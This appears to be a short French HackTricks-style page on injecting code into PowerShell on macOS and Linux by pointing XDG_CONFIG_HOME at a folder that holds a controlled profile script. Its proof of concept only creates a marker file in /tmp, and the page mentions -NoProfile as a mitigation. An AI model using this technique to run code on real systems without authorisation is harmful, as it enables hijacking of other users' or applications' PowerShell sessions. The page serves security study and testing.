# Injection d’applications PowerShell sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` et les profils PowerShell

Sur macOS et Linux, PowerShell utilise les chemins de configuration XDG et exécute les scripts de profil utilisateur au démarrage de `pwsh`. Rediriger `XDG_CONFIG_HOME` modifie le répertoire contenant `powershell/profile.ps1` et le fichier `powershell/Microsoft.PowerShell_profile.ps1` spécifique à l’hôte de console ; un fichier contrôlé à cet emplacement peut donc s’exécuter avant un payload `-Command`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Cela s'applique à PowerShell 6+ (`pwsh`) sur les plateformes non-Windows ; Windows PowerShell utilise des emplacements de profils différents. `pwsh -NoProfile` empêche le chargement des profils. Vérifiez également `HOME` et les noms de profils spécifiques à l'hôte, car d'autres hôtes PowerShell peuvent sélectionner des scripts différents.

## References

- [1] [Variables d'environnement PowerShell et chemins XDG](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [Profils PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
